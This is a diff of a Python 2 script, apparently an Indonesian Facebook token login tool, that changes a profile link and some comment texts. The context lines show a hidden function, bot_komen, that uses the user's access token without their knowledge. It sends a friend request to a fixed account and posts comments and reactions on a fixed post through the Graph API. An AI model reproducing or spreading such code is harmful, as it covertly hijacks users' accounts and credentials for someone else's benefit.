@@ -194,7 +194,7 @@ def tokenz():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m[\033[1;91m✓\033[1;97m]\033[1;33m Login Berhasil'
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100009218573546 ')
+		os.system('xdg-open https://www.facebook.com/44K453P.404 ')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
@@ -209,11 +209,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100009218573546')
-	kom = ('GW PAKE SCRIPT LU AA')
+	kom = ('Hello Aa IAN')
 	reac = ('ANGRY')
 	post = ('2658937331090193')
 	post2 = ('2658937331090193')
-	kom2 = ('SCRIPT LU KEREN AA')
+	kom2 = ('Keren')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
